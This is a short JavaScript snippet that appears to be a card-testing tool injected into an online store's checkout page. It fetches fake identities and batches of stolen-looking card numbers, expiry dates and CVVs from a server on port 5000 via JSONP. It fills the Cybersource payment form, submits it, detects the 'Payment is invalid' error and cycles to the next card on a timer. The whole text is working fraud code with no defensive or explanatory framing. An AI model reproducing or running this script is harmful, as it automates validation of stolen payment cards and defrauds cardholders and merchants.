var postUrl = "http://" + baseUrl + ":5000/post";
var fakeUrl = "http://" + baseUrl + ":5000/fake?city=Miami&callback=fake";
var iteration = null;
var options = {
     url:fakeUrl,
     dataType: "jsonp"
};
var cards = function(arr) {
  var i = 0;
  var len = arr.length;
        var segundos = 5;

  var iteration = function() {
    if( i < len ) {
      var json = arr[i];
      jQuery("#wmg_cybersource_cc_type").val(json.card[0] == "4" ? "VI" : "MC");
      jQuery("#wmg_cybersource_cc_number").val(json.card);
      jQuery("#wmg_cybersource_expiration").val(Number(json.mon));
      jQuery("#wmg_cybersource_expiration_yr").val("20" + json.year);
      jQuery("#wmg_cybersource_cc_cid").val(json.cvv);
      jQuery(".button.action.large.arrowed").click();

      var interval = setInterval(function() {
        console.log("Procesando");
        if(jQuery(".toast-item.toast-type-error>p").text().indexOf("Payment is invalid") >= 0) {
          console.log("Probemos otra");
          clearInterval(interval);
          jQuery(".toast-item-close").click()
          setTimeout(iteration, 15000);
        }
      }, 3000)
    }
    else {
      jQuery.ajax(options)
      .success(cards);
    }

    i++;
  }

  iteration();
};
var fake = function( person ) {
  console.log( person.fullname );

  jQuery("#wmg_cybersource_cc_owner").val( person.firstname + " " + person.lastname );

  options.url = postUrl;
  jQuery.ajax(options)
  .success(cards);;
}
// store.WizKhalifa
jQuery.ajax(options)
.success(fake);